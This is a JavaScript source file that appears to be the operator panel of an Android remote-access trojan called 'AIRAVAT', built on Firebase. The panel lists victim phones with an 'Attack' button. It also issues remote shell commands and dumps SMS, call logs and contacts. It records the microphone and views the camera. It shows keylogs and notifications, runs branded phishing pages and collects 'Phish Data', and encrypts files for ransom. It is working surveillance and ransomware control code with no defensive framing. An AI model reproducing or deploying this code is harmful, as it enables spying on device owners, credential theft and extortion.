$("#preloaderr").fadeOut();
var respov=$("#cmdref").val();
var var32="";
var unqid="";
var manager="";
var bckstp=0;
var database=firebase.database();
var lastkeynot="";
var lastkeykey="";
var lastkeyphish="";
var lastkeyvoice="";
var wallpaperno="";
var uo2=document.getElementById("users");

function opnav(o){
if($("#navbar").css("display") == "none"){

o.style.color="red";
o.innerHTML="&#10005;";
$("#navbar").css("display","block");
}
else{
o.style.color="white";
o.innerHTML="&#8801;";
$("#navbar").css("display","none");
}
}
var n=document.body.getAttribute("data-sig");

function hidekarbsdk(){
$("#micrec").css("display","none");
$("#wallpaperdiv").css("display","none");
$("#senddm").css("display","none");
$("#pvtt").css("display","none");
$("#toastdiv").css("display","none");
$("#notikey").css("display","none");
$("#viewers").css("display","none");
$("#fprev").css("display","none");
$("#resp").css("display","none");
$("#shellcmd").css("display","none");
$("#showphishj").css("display","none");
$("#camview").css("display","none");
$("#ransomdiv").css("display","none");
//$("#").css("display","none");
}

function userss(){
var o="hiddenser";
var database = firebase.database();
localStorage.setItem("airavatpass",o);
var ref = database.ref("/online/online"+n);
ref.on("value",(snapshot) =>{
if (snapshot.exists()) {
var scores=snapshot.val();
var keys=Object.keys(scores);
uo2.innerHTML="<br>";
for(var i=0;i<keys.length;i++){
var k=keys[i];
var aversion=scores[k].device.android;
var battery=scores[k].device.battery;
var model=scores[k].device.phone;
var ip=scores[k].device.rooted;
var uid=scores[k].device.id;
uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+aversion+'</span><br><br>Rooted: '+ip+' <span style="float:right" >Battery: '+battery+' </span><br><br><center><button onclick="setdev('+"'"+uid+"'"+')">Attack</button></center></div> '; 
}
}
else{
uo2.innerHTML="No online Devices";
}
});
}
userss();

function setdev(o){
respov="/comds/comds"+o;
unqid=o;
$("#cmdref").val("/comds/comds"+o);
showdat(o);
$("#users").css("display","none");
$("#backkk").css("display","block");
$("#phones").css("display","block");
}

//setdev("bqrvd8gu");
//window.onload=()=>{filesmanager()};

function setdatcmd(o,p,q,r){
var result= '';
var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
var charactersLength = characters.length;
for ( var i = 0; i < 8; i++ ) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
var store={
cmdn :o,
cmdv: p,
cmdvar : q,
rndm : result
};
//alert(JSON.stringify(store));
$("#phones").css("display","none");
//hidekarbsdk();
$("#preloaderr").fadeIn();
var con =  database.ref(r).child("comdss").set(store);
}

function cmd(){
var database=firebase.database();
var us=document.getElementById("cmdref").value;
var ref=database.ref(us);
var hio=document.getElementById("cmd").value;
var hio2=document.getElementById("cmdvar").value;
var hio3=document.getElementById("cmdvarm").value;
setdatcmd(hio,hio2,hio3,us);
//ref.child("Victor").setValue("setting");//.push(store);
//con.onDisconnect().remove();

}
function showdat(o){
var database = firebase.database();
var ref = database.ref("respos/respo"+o);
ref.on("child_changed",(snapshot) => {
if (snapshot.exists()) {
var dat=snapshot.val();
var respo=dat.respo+"";
var v1=dat.v1+"";
var v2=dat.v2+"";
var v3=dat.v3+"";
var32=dat.var2+"";
$("#preloaderr").fadeOut();
if(manager=="filesmanager"){
filesfol(respo,v1,v2,v3,var32);
}
else if(manager=="fileview"){
fileev(v1);
}
else if(manager=="shellview"){
shellviewer(v1);
}
else if(manager=="deviceinfo"){
showinfodev(v1);
}
else if(manager=="dialogview"){
showdialog(v1);
}
else if(manager=="camview"){
document.getElementById("camview").style.display="block";
document.getElementById("camimg").src=v1;
document.getElementById("downlocam").href=v1;
}
else{
}


/*

*/

} else {
console.log("No data available");
}
});
}
function backk(o){
if($("#users").css("display") == "none" && $("#phones").css("display") == "none"){
hidekarbsdk();
$("#users").css("display","none");
$("#phones").css("display","block");
}
else if($("#users").css("display") == "none" && $("#phones").css("display") != "none"){
hidekarbsdk();
$("#backkk").css("display","none");
$("#users").css("display","block");
$("#phones").css("display","none");
}
else{

}
}
function clrn(){
if(confirm("Are You Sure To delete all Keylogs")){
firebase.database().ref("notilogo").remove();}}
function clrk(){
if(confirm("Are You Sure To delete all Keylogs")){
firebase.database().ref("logolog").remove();}}
function clrv(){
if(confirm("Are You Sure To delete all Recordings")){
firebase.database().ref("records").remove();}}
function clrpi(){
if(confirm("Are You Sure To delete all Phish Data")){
firebase.database().ref("pdata").remove();}}

function showphish(){
manager="notikey";
if(manager=="notikey"){
var psdus=document.getElementById("notikey");
hidekarbsdk();
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("pdata/pdataonline"+n);
ref.limitToFirst(10).on("value",gotData);
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='<div onclick="clrpi()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var data2=scores[k].data;

psdus.innerHTML+='<div class="keylogg" >'+data2+"</div>";
}
if(lastkeyphish != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyphish=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="showphishu(this,'+"'"+lastkeyphish+"'"+')"'+">Load More</button></center><br>";

}
lastkeyphish=keys[keys.length-1]+"";

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Victims  Found<h4></div>';
}

}
}
}

function showphishu(o,p){
manager="notikey";
if(manager=="notikey"){
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("notikey");
var database = firebase.database();
var ref = database.ref("pdata/pdataonline"+n);
ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
function gotData(data){
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var data2=scores[k].data;
psdus.innerHTML+='<div class="keylogg" >'+data2+"</div>";
}
if(lastkeyphish != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyphish=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="showphishu(this,'+"'"+lastkeyphish+"'"+')"'+">Load More</button></center><br>";
}
lastkeyphish=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Victims Found<h4></div>';
}
}
}
}


function changewallpaper(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#wallpaperdiv").css("display","block");
}



function setwalls(){
alert(wallpaperno)
setdatcmd("changewall",wallpaperno,"",respov);
}

function selectimg(o,p){
for(var u=0;u<3;u++){
$(".wallimg").children().eq(u).css("border","none")
}
$(o).css("border","2px solid red");
wallpaperno=p+"";
}

function setdatcmd2(o,p,q,s,r){
var result= '';
var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
var charactersLength = characters.length;
for ( var i = 0; i < 8; i++ ) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
var store={
cmdn :o,
cmdv: p,
cmdvar : q,
cmdvar2 : s, 
rndm : result
};

$("#phones").css("display","none");
//hidekarbsdk();
$("#preloaderr").fadeIn();
var con =  database.ref(r).child("comdss").set(store);
}

function iojh(){
var yi=['dropbox3.png','facebook2.png','facebook5.png','free_fire3.png','github1.png','instagram1.png','linkedin1.png','messenger1.png','microsoft1.png','netflix1.png','paypal2.png','protonmail1.png','pubg2.png','snapchat1.png','tumblir1.png','twitter1.png','wordpress1.png','yahoo1.png'];
document.getElementById("hion").src="./imgg/"+yi[parseInt($("#lshpih").val())];
}
function execphish(){
setdatcmd2("phpage",$("#phpage").val(),$("#nshpih").val(),$("#lshpih").val(),"comds/comds"+unqid+"phi");
}
function execphish2(){
setdatcmd2("cust",$("#shpih").val(),$("#nshpih").val(),$("#lshpih").val(),"comds/comds"+unqid+"phi");
}
function recordvoice(){
setdatcmd("micrec",(parseInt($("#recval").val())*1000),"","comds/comds"+unqid+"phi");
}
function micrec(){
voicess();
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#micrec").css("display","block");
}
function sendsms(){
if((!isNaN($("#smsnumber").val() )) && $("#smscontent").val() != "" ){
setdatcmd("sendsms",$("#smsnumber").val(),$("#smscontent").val(),respov);
}else{
alert("Please Enter Valid Data");
}
}
function sendmsg(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#senddm").css("display","block");
}
function ttsf(){
if($("#ttscmd").val() != ""){
setdatcmd("ttsdev",$("#ttscmd").val(),"",respov);
}
else{
alert("Please Enter Valid Text");
}
}
function webssow(){
if($("#webscmd").val() != ""){
setdatcmd("openweburi",$("#webscmd").val(),"",respov);
}
else{
alert("Please Enter Valid URL");
}
}
function vibra(){
if(!isNaN($("#vibratecmd").val())){
setdatcmd("vibratedev",($("#vibratecmd").val() * 1000),"",respov);
}
else{
alert("Please Enter Valid Time");
}
}
function playmus(){
if($("#musiccmd").val().indexOf(".mp3") > 0){
setdatcmd("playsmusic",$("#musiccmd").val(),"",respov);
}
else{
alert("Please Enter Valid URL");
}
}
function showphpag(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#showphishj").css("display","block");

}
function funcmd(o){
hidekarbsdk();
var ooj='#'+o;
$("#plmc").css('display','none');
$("#vibradev").css('display','none');
$("#ttsdev").css('display','none');
$("#webdev").css('display','none');
$(ooj).css('display','block');
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#pvtt").css("display","block");
}
function showdialog(o){
$("#diamain").css("display","flex");
$("#diatext").html(o);
}
function toastt(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#toastdiv").css("display","block");
}
function ransomwares(){
hidekarbsdk();
manager="dialogview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#ransomdiv").css("display","block");
}
function ransomen(){
setdatcmd("ransom1",$("#ransomcmd").val(),"",respov);
}
function ransomde(){
setdatcmd("ransom2",$("#ransomcmd").val(),"",respov);
}
function toastexc(){
setdatcmd("toasttext",$("#toastcmd").val(),"",respov);
}
function deviceinfo(){
hidekarbsdk();
manager="deviceinfo";
$("#phones").css("display","none");
$("#users").css("display","none");
setdatcmd("deviceinfo","","",respov);
}
function siminfo(){
hidekarbsdk();
manager="deviceinfo";
$("#phones").css("display","none");
$("#users").css("display","none");
setdatcmd("simcardinfo","","",respov);
}
function showinfodev(o){
hidekarbsdk();
$("#notikey").css("display","block");
$("#notikey").html(o);
}
function startshell(){
hidekarbsdk();
manager="shellview";
$("#phones").css("display","none");
$("#users").css("display","none");
$("#shellcmd").css("display","block");
}
function shellcm(o){
if (event.keyCode === 13) {
setdatcmd("shellcmd",o.value,"",respov);
}
}
function logsout(){
localStorage.setItem("logino","false");
window.location.href="";
}
function shellviewer(o){
$("#shellcmd").css("display","block");
$("#shelldata").html("AIRAVAT Shell<br><br>"+o.replaceAll("\n","<br>"))

}
function convertTimestamp(timestamp) {
var d = new Date(timestamp),	// Convert the passed timestamp to milliseconds
yyyy = d.getFullYear(),
mm = ('0' + (d.getMonth() + 1)).slice(-2),	// Months are zero based. Add leading 0.
dd = ('0' + d.getDate()).slice(-2),			// Add leading 0.
hh = d.getHours(),
h = hh,
min = ('0' + d.getMinutes()).slice(-2),		// Add leading 0.
ampm = 'AM',
time;
if (hh > 12) {
h = hh - 12;
ampm = 'PM';
} else if (hh === 12) {
h = 12;
ampm = 'PM';
} else if (hh == 0) {
h = 12;
}
time = yyyy + '-' + mm + '-' + dd + ', ' + h + ':' + min + ' ' + ampm;
return time;
}
function voicess(){
manager="notikey";
if(manager=="notikey"){
var psdus=document.getElementById("showrecs");
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("records/"+unqid);
ref.limitToFirst(10).once("value",gotData);
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='<div onclick="clrv()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
var rndm='recs'+Math.floor((Math.random() * 1000 ) + 100);
var rndm2='.'+rndm;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var recs=scores[k].url;
var times=scores[k].time;

psdus.innerHTML+='<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="'+recs+'" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio('+"'"+recs+"'"+')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>'+convertTimestamp(parseInt(times))+'</div><br>';
}

if(lastkeyvoice != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyvoice=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="voicessu(this,'+"'"+lastkeyvoice+"'"+')"'+">Load More</button></center><br>";
}
lastkeyvoice=keys[keys.length-1];

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Recordings Found<h4></div>';
}

}
}
}
function voicessu(o,p){
manager="notikey";
if(manager=="notikey"){
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("showrecs");
var database = firebase.database();
var ref = database.ref("records/"+unqid);
ref.orderByKey().startAt(p).limitToFirst(10).once("value",gotData);
function gotData(data){
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
var rndm='recs'+Math.floor((Math.random() * 1000 ) + 100);
var rndm2='.'+rndm;

for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var recs=scores[k].url;
var times=scores[k].time;
psdus.innerHTML+='<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="'+recs+'" type="audio/mpeg" /></audio><div class="downlii"onclick="downliio('+"'"+recs+"'"+')" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>'+convertTimestamp(parseInt(times))+'</div><br>';


}

if(lastkeyvoice != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeyvoice=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="voicessu(this,'+"'"+lastkeyvoice+"'"+')"'+">Load More</button></center><br>";
}
lastkeyvoice=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Recordings Found<h4></div>';
}
}
}
}
function keylogger(){
manager="notikey";
if(manager=="notikey"){
var psdus=document.getElementById("notikey");
hidekarbsdk();
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("logolog/"+unqid);
ref.limitToFirst(10).once("value",gotData);
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='<div onclick="clrk()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var event=scores[k].logoev;
var date=scores[k].logodate;
var msg=scores[k].msg;

psdus.innerHTML+='<div class="keylogg" ><b>Event: </b>'+event+'<br><br><b>Time: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
}
if(lastkeykey != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeykey=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoreeu(this,'+"'"+lastkeykey+"'"+')"'+">Load More</button></center><br>";

}
lastkeykey=keys[keys.length-1]+"";

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
}

}
}
}
function loadmoreeu(o,p){
manager="notikey";
if(manager=="notikey"){
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("notikey");
var database = firebase.database();
var ref = database.ref("logolog/"+unqid);
ref.orderByKey().startAt(p).limitToFirst(10).once("value",gotData);
function gotData(data){
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var event=scores[k].logoev;
var date=scores[k].logodate;
var msg=scores[k].msg;

psdus.innerHTML+='<div class="keylogg" ><b>Event: </b>'+event+'<br><br><b>Time: </b>'+date+'<br><br><b>Msg: </b>'+msg+"</div>";
}
if(lastkeykey != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeykey=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoreeu(this,'+"'"+lastkeykey+"'"+')"'+">Load More</button></center><br>";
}
lastkeykey=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Logs Found<h4></div>';
}
}
}
}
function notificationlog(){
manager="notikey";
var psdus=document.getElementById("notikey");
hidekarbsdk();
$("#preloaderr").fadeIn();
$("#phones").css("display","none");
var database = firebase.database();
var ref = database.ref("notilogo/"+unqid);
if(manager=="notikey"){
ref.limitToFirst(10).once("value",gotData);
}
function gotData(data){
$("#preloaderr").fadeOut();
psdus.style.display="block";
psdus.innerHTML='<div onclick="clrn()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
if (data.exists()) {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var ico=scores[k].icon;
var packa=scores[k].package;
var title=scores[k].title;
var time=scores[k].time;
var ticker=scores[k].ticker;
var text=scores[k].text;
var name=scores[k].name;
if(ticker != ""){
ticker='('+ticker+')';
}
psdus.innerHTML+='<div class="keylogg" >'
+'<img src="data:image/png;base64,'+ico+'" >'
+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
+'<br><p>'+text+'</p>'
+'<br><span>'+convertTimestamp(time)+'</span>'
+'</div>';
}
if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeynot=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";

}

lastkeynot=keys[keys.length-1]+"";

}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
}
}
}
function loadmoree(o,p){
manager=="notikey";
o.innerHTML=".....";
o.disabled=true;
var psdus=document.getElementById("notikey");
var database = firebase.database();

var ref = database.ref("notilogo/"+unqid);
if(manager=="notikey"){
ref.orderByKey().startAt(p).limitToFirst(10).once("value",gotData);
}
function gotData(data){
if (data.exists() && manager=="notikey") {
var scores=data.val();
var keys=Object.keys(scores);
var i=0;
psdus.style.display="block";
o.style.display="none";
for(i=(keys.length-1);i > -1 ;i--){
var k=keys[i];
var ico=scores[k].icon;

var packa=scores[k].package;
var title=scores[k].title;
var time=scores[k].time;
var ticker=scores[k].ticker;
var text=scores[k].text;
var name=scores[k].name;
if(ticker != ""){
ticker='('+ticker+')';
}


psdus.innerHTML+='<div class="keylogg" >'
+'<img src="data:image/png;base64,'+ico+'" >'
+'<div style="margin-left:60px;overflow:auto; "><b  style="color:green"> '+name+'</b><br><b style="color:red">'+packa+'</b><br><br><br></div>'
+'<h4>'+title+'<br><b>'+ticker+'</b> </h4>'
+'<br><p>'+text+'</p>'
+'<br><span>'+convertTimestamp(time)+'</span>'
+'</div>';

}
if(lastkeynot != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
lastkeynot=keys[keys.length-1]+"";
psdus.innerHTML+="<br><center><button class='btn' "+'onclick="loadmoree(this,'+"'"+lastkeynot+"'"+')"'+">Load More</button></center><br>";
}
lastkeynot=keys[keys.length-1]+"";
}
else{
psdus.innerHTML='<div class="keylogg" ><h4>No Notifications Found<h4></div>';
}
}

}
function dumpsms(){
manager="fileview";
setdatcmd("dmpsms","","",respov);
}
function calllogs(){
manager="fileview";
setdatcmd("dmpcall","","",respov);
}
function dumpcontact(){
manager="fileview";
setdatcmd("dmpcont","","",respov);
}
function getpackages(){
manager="fileview";
setdatcmd("getpackages","","",respov);
}
function fileev(o){
document.getElementById("vieweri").src="data:text/html,<h4 style='color:green' > Getting File for preview....</h4>";
document.getElementById("viewers").style.display="block";
document.getElementById("vieweri").src=o;
document.getElementById("downlo").href=o;
}
function filesmanager(){
manager="filesmanager";
$("#resp").css("display","block");
$("#phones").css("display","none");
setdatcmd("cd","/sdcard/","",respov);
}
function filesfol(respo,v1,v2,v3,var32){
var uo=document.getElementById("resp");
uo.style.display="block";
if(respo == "imgview"){
document.getElementById("fprev").style.display="block";
document.getElementById("imv2").style.display="none";
document.getElementById("imv").style.display="inline";
document.getElementById("imv").src="data:image/png;base64,"+v1;
document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="data:image/png;base64,'+v1+'">Download File</a><br>';
}
//  ///


else if(respo == "fileview"){
document.getElementById("fprev").style.display="block";
document.getElementById("imv2").style.display="inline";
document.getElementById("imv2").src=v1;
document.getElementById("imv").style.display="none";
document.getElementById("fprevdes").innerHTML=v2+'<li><a download=""  id="btdwn" target="_blank"  href="'+v1+'">Download File</a><br>';


}
else if(respo == "dialogview"){
showdialog(v1);
}
else{
uo.innerHTML=""+respo; //+"<br>"+dat.var2;
}

}
function opfol(event){
var target = event.target || event.srcElement;
clx=event.clientX;
cly=event.clientY;

if(((screen.height - cly)/2) < 122){
document.getElementById("filwt").style.top=(screen.height-300)+"px";
document.getElementById("filwt").style.left=clx+"px";
}
else{
document.getElementById("filwt").style.top=cly+"px";
document.getElementById("filwt").style.left=clx+"px";
}
tarfol=event.target.innerHTML;


if(tarfol.indexOf(".pkc") > -1){
document.getElementById("decrfol").style.display="block";
}
else{
document.getElementById("decrfol").style.display="none";
}

if(tarfol==".."){
setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
}
else{
document.getElementById("filwt").style.display="block";
document.getElementById("filwt").setAttribute("data-file",tarfol);
document.getElementById("filwt").setAttribute("data-type",event.target.getAttribute("class"));
}
}

function opfol22(o){
document.getElementById("filwt").style.display="none";
var tarfol=o.parentElement.parentElement.getAttribute("data-file");

if(tarfol==".."){
setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
}
else if(tarfol.indexOf("<b>") > -1){
setdatcmd("cd",var32+"/"+tarfol.substr(0,tarfol.indexOf("<b>")),"",respov);
}
else{ 
setdatcmd("cd",var32+"/"+tarfol,"",respov);
}
}

function encryptfol(o){
document.getElementById("filwt").style.display="none";
var tarfol=o.parentElement.parentElement.getAttribute("data-file");
var tarfoltype=o.parentElement.parentElement.getAttribute("data-type");
if(tarfol==".."){
setdatcmd("cd",var32.substr(0,var32.lastIndexOf("/")),"",respov);
}
else if((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)){
setdatcmd("encrypt",var32+"/"+tarfol.substr(0,tarfol.indexOf("<b>")),"",respov);
setdatcmd("cd","/sdcard/","",respov);
}
else{ 
setdatcmd("encrypt",var32+"/"+tarfol,"",respov);
setdatcmd("cd","/sdcard/","",respov);
}

}
